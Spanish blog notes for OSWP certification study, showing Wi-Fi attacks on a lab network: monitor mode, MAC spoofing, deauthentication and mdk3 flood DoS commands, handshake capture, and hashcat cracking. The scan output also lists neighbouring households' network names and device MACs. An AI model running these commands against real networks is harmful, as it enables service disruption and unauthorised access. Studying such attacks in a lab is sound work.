---
layout: single
title: Hacking Wifi
excerpt: "Apuntes sobre como efectura un ataque contra redes Wifi en un laboratorio local"
date: 2021-12-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-magic/magic_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hacking Wifi
tags:
  - Certificación OSWP
  - Parrot OS
---

Tipos de ataques:

- Ataques a redes WPA con autenticación PSK 
- Ataques a redes WEP con clientes sin autenticación SKA 
- Ataques a redes WEP con clientes y autenticación SKA
- Ataques a redes WEP sin clientes 

# Ataques a redes WPA (La más común)

## Modo monitor

Primero que todo debemos ponernos en modo monitor (modo para capturar todos los paquetes de red que viajan a nuestro alrededor). Primero matamos los procesos que molestan y son inecesarios en modo monitor:

```bash
# sudo airmon-ng check kill

Killing these processes:

    PID Name
    841 wpa_supplicant
```

Y activamos modo monitor:

```bash
# sudo airmon-ng start wlan0

PHY	Interface	Driver		Chipset

phy0	wlan0		rtw_8821ce	Realtek Semiconductor Co., Ltd. RTL8821CE 802.11ac PCIe Wireless Network Adapter
		(monitor mode enabled)

```

Ya hemos activado el modo monitor. También podemos comprobarlo con:

```bash
# ifconfig wlan0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 28-CD-C4-95-28-5F-00-6E-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 84366  bytes 5347572 (5.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3  bytes 443 (443.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
En mi caso no cambia a **wlan0mon**, sino que el nombre se conserva ( **wlan0** ). Con modo monitor perdemos conexión a internet. Para volver a la normalidad hacemos:

```bash
sudo airmon-ng stop wlan0 && service NetworkManager restart
```
## Cambio de dirección MAC

Primero debemos bajar la interfaz de red para poder monipular la MAC:

```bash
# sudo ifconfig wlan0 down
```

Procedemos a cambiarla:

```bash
# sudo macchanger --mac=$(echo "$(macchanger -l | grep -i "national security agency" | awk '{print $3}'):da:1b:6a") wlan0

Current MAC:   28:cd:c4:a5:38:6f (unknown)
Permanent MAC: 28:cd:c4:a5:38:6f (unknown)
New MAC:       00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
```

## Analisis del entorno

Para registrar las redes wifi y estaciones(clientes) a nuestro alrededor, hacemos:

```bash
sudo airodump-ng wlan0
```


Y empieza el modo monitor:

```bash
CH  2 ][ Elapsed: 1 min ][ 2021-12-28 16:12 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F4:71:90:48:71:AC  -34      158        3    0   1   65   WPA2 CCMP   PSK  hacklab                                                    
 68:FF:7B:96:4A:B8  -57      181       10    0   6  130   WPA2 CCMP   PSK  FAMILIA LONDOÑO                                           
 04:95:E6:CE:0F:98  -53      138       18    0  10  130   WPA2 CCMP   PSK  Rodríguez Garro                                           
 50:D4:F7:BB:52:6D  -61       62        0    0   6  130   WPA2 CCMP   PSK  FAMILIA REINA                                              
 B0:4E:26:D4:77:8C  -62       34        1    0   3  270   WPA2 CCMP   PSK  Flia Trujillo                                              
 CC:06:77:B6:2D:A8  -80        8        0    0   1  130   WPA2 CCMP   PSK  FAMILIA CASTRILLON                                         
 F4:B7:8D:07:DC:C8  -80       12        1    0   6  130   WPA2 CCMP   PSK  FAMILIA REINA                                              
 A0:1C:8D:D2:23:0C  -71        2        0    0  11  130   WPA2 CCMP   PSK  FAMILIA DUARTE                                             
 90:17:3F:E7:F3:E4  -65        6        0    0   1  130   WPA2 CCMP   PSK  FLIA REALPE RESTREPO                                       

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 F4:71:90:48:71:AC  18:D6:1C:92:2A:E4  -31   24e- 1    317       19                                                                    
 68:FF:7B:96:4A:B8  EE:28:20:ED:9C:8C  -67    0 - 1      0        9                                                                    
 04:95:E6:CE:0F:98  A6:AA:AF:4D:46:FE  -102    0 - 6e    70        2                                                                    
 F4:B7:8D:07:DC:C8  52:D4:F7:0B:52:6D  -67    0 - 1e     0        4                                                                    
 F4:B7:8D:07:DC:C8  52:D4:F7:6F:8A:6D  -81    0 - 1e     0        1                                                                    
 F4:B7:8D:07:DC:C8  52:D4:F7:27:4B:35  -81    0 - 1e     0        1                                                                    
 F4:B7:8D:07:DC:C8  52:D4:F7:BB:52:6E  -81    0 - 1e     0        1                                                                    
```

La red de pruebas es **hacklab**. El siguiente script en bash permite guardar todas las redes y estaciones encontradas (redeswifi-estaciones.sh):

```
#!/bin/bash

if [[ "$1" && -f "$1" ]]; then
    FILE="$1"
else
    echo -e '\nEspecifica el fichero .csv a analizar\n';
    echo 'Uso:';
    echo -e "\t./parser.sh Captura-01.csv\n";
    exit  
fi

test -f oui.txt 2>/dev/null

if [ "$(echo $?)" == "0" ]; then
  
    echo -e "\n\033[1mNúmero total de puntos de acceso: \033[0;31m`grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE | wc -l`\e[0m"
    echo -e "\033[1mNúmero total de estaciones: \033[0;31m`grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE | wc -l`\e[0m"
    echo -e "\033[1mNúmero total de estaciones no asociadas: \033[0;31m`grep -E '(not associated)' $FILE | wc -l`\e[0m"
    
    echo -e "\n\033[0;36m\033[1mPuntos de acceso disponibles:\e[0m\n"
    
    while read -r line ; do
    
        if [ "`echo "$line" | cut -d ',' -f 14`" != " " ]; then
            echo -e "\033[1m" `echo -e "$line" | cut -d ',' -f 14` "\e[0m"
        else
            echo -e " \e[3mNo es posible obtener el nombre de la red (ESSID)\e[0m"
        fi
    
        fullMAC=`echo "$line" | cut -d ',' -f 1`
        echo -e "\tDirección MAC: $fullMAC"
    
        MAC=`echo "$fullMAC" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
        result="$(grep -i -A 1 ^$MAC ./oui.txt)";
    
        if [ "$result" ]; then
            echo -e "\tVendor: `echo "$result" | cut -f 3`"
        else
            echo -e "\tVendor: \e[3mInformación no encontrada en la base de datos\e[0m"
        fi
    
        is5ghz=`echo "$line" | cut -d ',' -f 4 | grep -i -E '36|40|44|48|52|56|60|64|100|104|108|112|116|120|124|128|132|136|140'`
    
        if [ "$is5ghz" ]; then
            echo -e "\t\033[0;31mOpera en 5 GHz!\e[0m"
        fi
    
        printonce="\tEstaciones:"
    
        while read -r line2 ; do
    
            clientsMAC=`echo $line2 | grep -E "$fullMAC"`
            if [ "$clientsMAC" ]; then
    
                if [ "$printonce" ]; then
                    echo -e $printonce
                    printonce=''
                fi
    
                echo -e "\t\t\033[0;32m" `echo $clientsMAC | cut -d ',' -f 1` "\e[0m"
                MAC2=`echo "$clientsMAC" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
                result2="$(grep -i -A 1 ^$MAC2 ./oui.txt)";
    
                if [ "$result2" ]; then
                    echo -e "\t\t\tVendor: `echo "$result2" | cut -f 3`"
                    ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`
                    warning=`echo $result2 | grep -i -E 'ALFA|Intel'`
                    if [ "$ismobile" ]; then
                        echo -e "\t\t\t\033[0;33mEs probable que se trate de un dispositivo móvil\e[0m"
                    fi
    
                    if [ "$warning" ]; then
                        echo -e "\t\t\t\033[0;31;5;7mEl dispositivo soporta el modo monitor\e[0m"
                    fi
    
                else
                    echo -e "\t\t\tVendor: \e[3mInformación no encontrada en la base de datos\e[0m"
                fi
    
                probed=`echo $line2 | cut -d ',' -f 7`
    
                if [ "`echo $probed | grep -E [A-Za-z0-9_\\-]+`" ]; then
                    echo -e "\t\t\tRedes a las que el dispositivo ha estado asociado: $probed"
                fi        
            fi
        done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE)
        
    done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)
    
    echo -e "\n\033[0;36m\033[1mEstaciones no asociadas:\e[0m\n"
    
    while read -r line2 ; do
    
        clientsMAC=`echo $line2  | cut -d ',' -f 1`
    
        echo -e "\033[0;31m" `echo $clientsMAC | cut -d ',' -f 1` "\e[0m"
        MAC2=`echo "$clientsMAC" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
        result2="$(grep -i -A 1 ^$MAC2 ./oui.txt)";
    
        if [ "$result2" ]; then
            echo -e "\tVendor: `echo "$result2" | cut -f 3`"
            ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`
            warning=`echo $result2 | grep -i -E 'ALFA|Intel'`
            if [ "$ismobile" ]; then
                echo -e "\t\033[0;33mEs probable que se trate de un dispositivo móvil\e[0m"
            fi
            if [ "$warning" ]; then
                echo -e "\t\033[0;31;5;7mEl dispositivo soporta el modo monitor\e[0m"
            fi
        else
            echo -e "\tVendor: \e[3mInformación no encontrada en la base de datos\e[0m"
        fi
    
        probed=`echo $line2 | cut -d ',' -f 7`
    
        if [ "`echo $probed | grep -E [A-Za-z0-9_\\-]+`" ]; then
            echo -e "\tRedes a las que el dispositivo ha estado asociado: $probed"
        fi        
    
    done < <(grep -E '(not associated)' $FILE)
else
    echo -e "\n[!] Archivo oui.txt no encontrado, descárgalo desde aquí: http://standards-oui.ieee.org/oui/oui.txt\n"
fi
```

Para usarlo primero debemos guardar los datos registrados en el analisis de entorno:

```bash
# sudo airodump-ng wlan0 -w Captura
```

La primera vez que queramos ejecutar el script hacemos:

```bash
# chmod +x redeswifi-estaciones.sh

# wget http://standards-oui.ieee.org/oui/oui.txt
```

Lo ejecutamos:

```bash
# ./redeswifi-estaciones.sh Captura-01.csv 

Número total de puntos de acceso: 8
Número total de estaciones: 12
Número total de estaciones no asociadas: 0

Puntos de acceso disponibles:

 FAMILIA TORO 
	Dirección MAC: F8:1A:67:D2:19:B0
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 FAMILIA REINA 
	Dirección MAC: F4:B7:8D:07:DC:C8
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
	Estaciones:
		 9C:BC:F0:7F:9A:86 
			Vendor: Xiaomi Communications Co Ltd
			Es probable que se trate de un dispositivo móvil
		 52:D4:F7:0B:52:6D 
			Vendor: Información no encontrada en la base de datos
		 52:D4:F7:BB:52:6E 
			Vendor: Información no encontrada en la base de datos
		 52:D4:F7:27:4B:35 
			Vendor: Información no encontrada en la base de datos
		 52:D4:F7:6F:8A:6D 
			Vendor: Información no encontrada en la base de datos
 FAMILIA REINA 
	Dirección MAC: 50:D4:F7:BB:52:6D
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 FAMILIA CASTRILLON 
	Dirección MAC: CC:06:77:B6:2D:A8
	Vendor: Fiberhome Telecommunication Technologies Co.,LTD
	Estaciones:
		 18:87:40:B5:A8:41 
			Vendor: Xiaomi Communications Co Ltd
			Es probable que se trate de un dispositivo móvil
 FLIA REALPE RESTREPO 
	Dirección MAC: 90:17:3F:E7:F3:E4
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
 Flia Trujillo 
	Dirección MAC: B0:4E:26:D4:77:8C
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 Rodríguez Garro 
	Dirección MAC: 04:95:E6:CE:0F:98
	Vendor: Tenda Technology Co.,Ltd.Dongguan branch
	Estaciones:
		 EE:E6:49:1D:75:C4 
			Vendor: Información no encontrada en la base de datos
		 A2:78:25:99:B1:06 
			Vendor: Información no encontrada en la base de datos
		 A6:AA:AF:4D:46:FE 
			Vendor: Información no encontrada en la base de datos
 hacklab 
	Dirección MAC: F4:71:90:48:71:AC
	Vendor: Samsung Electronics Co.,Ltd
	Estaciones:
		 18:D6:1C:92:2A:E4 
			Vendor: Shenzhen TINNO Mobile Technology Corp.
			Es probable que se trate de un dispositivo móvil

Estaciones no asociadas:

```

## Fijar una red

```bash
# sudo airodump-ng -c 1 -w Captura --bssid F4:71:90:48:71:AC wlan0

 CH  1 ][ Elapsed: 42 s ][ 2021-12-28 16:40 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F4:71:90:48:71:AC  -29 100      412      168    0   1   65   WPA2 CCMP   PSK  hacklab                                                

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 F4:71:90:48:71:AC  18:D6:1C:92:2A:E4  -56    1e-24e     0      191

```

-c es el canal en el que se encuentra la red, y --bssid es la MAC de AP (Access Point). 

## Captura de Handshake

**Ataque de deautenticación dirigido:** Tratamos de expulsar a una estación especifica de la red:

```bash
# sudo aireplay-ng -0 10 -a F4:71:90:48:71:AC -c 18:D6:1C:92:2A:E4 wlan0

17:04:40  Waiting for beacon frame (BSSID: F4:71:90:48:71:AC) on channel 1
17:04:41  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [ 1|17 ACKs]
17:04:41  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [16|41 ACKs]
17:04:42  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [ 0|50 ACKs]
17:04:43  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [ 0|26 ACKs]
17:04:44  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [ 0|52 ACKs]
17:04:44  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [ 0|26 ACKs]
17:04:45  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [ 0|51 ACKs]
17:04:46  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [ 0|26 ACKs]
17:04:48  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [ 0|89 ACKs]
17:04:48  Sending 64 directed DeAuth (code 7). STMAC: [18:D6:1C:92:2A:E4] [ 0|23 ACKs]

```

-a es la MAC del AP y -c es la MAC del cliente. También, se puede hacer intentos de deautenticación infinitos:

- sudo aireplay-ng -0 0 -a F4:71:90:48:71:AC -c 18:D6:1C:92:2A:E4 wlan0

**Ataque de deautenticación global:** Lo mismo que antes, pero a todos las estaciones que se detecten en la red objetivo.

- sudo aireplay-ng -0 10 -a F4:71:90:48:71:AC -c FF:FF:FF:FF:FF:FF wlan0

- sudo aireplay-ng -0 0 -a F4:71:90:48:71:AC  -c FF:FF:FF:FF:FF:FF wlan0

**Ataque de autenticación:** Autentica muchos clientes y al final la red se vuelve lenta y expulsa a todos (DoS):

```bash
# sudo mdk3 wlan0 a -a F4:71:90:48:71:AC

AP F4:71:90:48:71:AC is responding!           
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with   500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  1000 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  1500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  2000 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  2500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  3000 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  3500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  4000 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  4500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  5000 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  5500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  6000 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  6500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  7000 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  7500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  8000 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  8500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  9000 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with  9500 clients connected!
AP F4:71:90:48:71:AC seems to be INVULNERABLE!      
Device is still responding with 10000 clients connected!

```

# Fuerza bruta con Hashcat

Creamos un formato utilizable por hashcat:

```bash
# sudo aircrack-ng -j hashcatCapture Captura-01.cap

Opening Captura-01.cape wait...
Read 5110 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat (3.60+) file...

[*] ESSID (length: 7): hacklab
[*] Key version: 2
[*] BSSID: 20:34:FB:B1:C5:53
[*] STA: 34:41:5D:46:D1:38
[*] anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
[*] snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
[*] Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to hashcatCapture.hccapx
``` 

Y crackeamos con hashcat:

- sudo hashcat -m 2500 -d 1 hashcatCapture.hccapx /usr/share/wordlists/rockyou.txt

- sudo hashcat -m 2500 -d 1 hashcatCapture.hccapx /usr/share/wordlists/rockyou.txt --force -w 3

Y para imprimir solo la contraseña encontrada previamente:

- sudo hashcat --show -m 2500 hashcatCapture.hccapx 


Fuente: [https://s4vitar.github.io/oswp-preparacion/#](https://s4vitar.github.io/oswp-preparacion/#)
